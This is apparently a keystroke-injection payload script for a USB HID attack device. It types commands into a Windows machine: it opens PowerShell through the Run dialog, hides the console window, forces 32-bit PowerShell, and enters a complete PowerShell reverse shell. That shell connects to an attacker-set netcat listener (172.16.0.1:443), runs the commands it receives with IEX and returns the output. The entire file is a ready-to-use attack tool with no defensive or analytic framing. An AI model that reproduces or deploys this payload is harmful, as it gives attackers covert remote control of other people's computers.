// Change to your netcat listener IP
var IP = "172.16.0.1";

// Change to your netcat listener Port
var PORT = "443";



language="us";
hide=true;

function hidePS() {
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
  	press("ENTER");
}

function assurePS32() {
  type("if ([IntPtr]::Size -ne 4){& $env:SystemRoot\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe}\n");
  delay(500);
}

function hidDownAndIEX(IP, PORT) {
  type("$test = New-Object System.Net.Sockets.TCPClient('" + IP + "'," + PORT + ");$test2 = $test.GetStream();[byte[]]$test3 = 0..65535|%{0};\n")
  type("while(($i = $test2.Read($test3, 0, $test3.Length)) -ne 0){;")
  type("$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($test3,0, $i);")
  type("$test4 = (IEX $data 2>&1 | Out-String );")
  type("$test5 = $test4 + 'PS ' + (pwd).Path + '> ';")
  type("$test6 = ([text.encoding]::ASCII).GetBytes($test5);")
  type("$test2.Write($test6,0,$test6.Length);")
  type("$test2.Flush()};")
  type("$test.Close()")
  press("ENTER");
  press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);

}

layout(language); 
typingSpeed(0,0);

press("GUI r");
delay(500);
type("powershell\n");
delay(500);

if (hide) { hidePS(); } 
delay(500);
assurePS32(); 
delay(500);
hidDownAndIEX(IP, PORT);
